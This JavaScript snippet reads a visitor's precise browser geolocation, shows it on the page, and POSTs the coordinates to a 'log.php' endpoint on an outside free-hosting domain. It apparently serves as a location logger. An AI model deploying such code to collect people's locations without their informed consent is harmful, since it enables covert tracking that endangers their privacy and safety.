function sendCoords(lat, lng) {
    fetch("https://auth.fwh.is/log.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "lat=" + lat + "&lng=" + lng
    })
    .then(res => res.text())
    .then(data => {
        console.log("Server reply:", data);
    })
    .catch(err => console.error("Error:", err));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                let lat = pos.coords.latitude;
                let lng = pos.coords.longitude;
                document.getElementById("location").innerText =
                    `Lat: ${lat}, Lng: ${lng}`;
                sendCoords(lat, lng); // send to InfinityFree backend
            },
            err => {
                document.getElementById("location").innerText = "Error: " + err.message;
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    } else {
        document.getElementById("location").innerText = "Geolocation not supported.";
    }
}
